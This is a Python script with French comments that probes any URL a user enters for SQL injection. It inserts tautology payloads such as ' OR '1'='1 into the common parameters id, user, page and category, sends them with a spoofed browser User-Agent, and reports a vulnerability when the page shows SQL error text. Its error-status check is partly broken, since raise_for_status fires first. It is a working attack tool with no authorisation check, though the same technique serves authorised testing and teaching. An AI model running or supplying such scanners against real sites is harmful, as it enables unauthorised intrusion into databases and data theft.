import requests
import time
import logging

# Configuration du logging pour enregistrer les résultats dans un fichier
logging.basicConfig(filename='tests_injection_sql.log', level=logging.INFO)

# Liste de payloads pour tester les injections SQL
payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR ''='"]

# Liste des paramètres à tester dans l'URL
parametres = ["id", "user", "page", "category"]

# Définition des en-têtes HTTP pour rendre les requêtes plus réalistes
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
}

def test_sql_injection(url):
    """
    Fonction pour tester les injections SQL sur une URL donnée.
    Elle tente différents payloads sur plusieurs paramètres d'URL et analyse les réponses.
    """
    for param in parametres:  # On parcourt chaque paramètre à tester dans l'URL
        for payload in payloads:  # On teste chaque payload d'injection SQL
            test_url = f"{url}?{param}={payload}"  # Création de l'URL de test avec le paramètre et le payload
            try:
                # Envoi de la requête HTTP avec les en-têtes définis précédemment
                response = requests.get(test_url, headers=headers)
                response.raise_for_status()  # Vérifie les erreurs HTTP comme 404, 500, etc.

                # Vérification des erreurs possibles dans le texte de la réponse
                if response.status_code >= 400:
                    print(f"Réponse d'erreur détectée : {response.status_code}")
                    print(f"URL: {test_url}")
                    logging.info(f"Erreur détectée à l'URL {test_url} avec le code {response.status_code}")
                    return True

                # Recherche des erreurs SQL dans la réponse (par exemple 'SQL' ou 'syntax')
                if "SQL" in response.text or "syntax" in response.text:
                    print(f"Vulnérabilité SQL détectée avec le payload : {payload}")
                    print(f"URL : {test_url}")
                    logging.info(f"Vulnérabilité SQL trouvée avec le payload {payload} à l'URL {test_url}")
                    return True

                # Attente de 1 seconde entre les requêtes pour éviter de trop solliciter le serveur
                time.sleep(1)
                
            except requests.exceptions.RequestException as e:
                # Si une exception se produit pendant la requête (par exemple, une erreur réseau), on la logge
                print(f"Erreur lors de la requête vers {test_url}: {e}")
                logging.error(f"Erreur lors de la requête vers {test_url}: {e}")
                continue  # On continue avec le prochain test

    return False  # Si aucune vulnérabilité n'est trouvée, la fonction retourne False

if __name__ == "__main__":
    # Demande à l'utilisateur d'entrer l'URL cible pour tester les injections SQL
    url_cible = input("Entrez l'URL cible : ")

    # Appel de la fonction pour tester les injections SQL sur l'URL donnée
    if test_sql_injection(url_cible):
        print("Vulnérabilité détectée.")
    else:
        print("Aucune vulnérabilité détectée.")
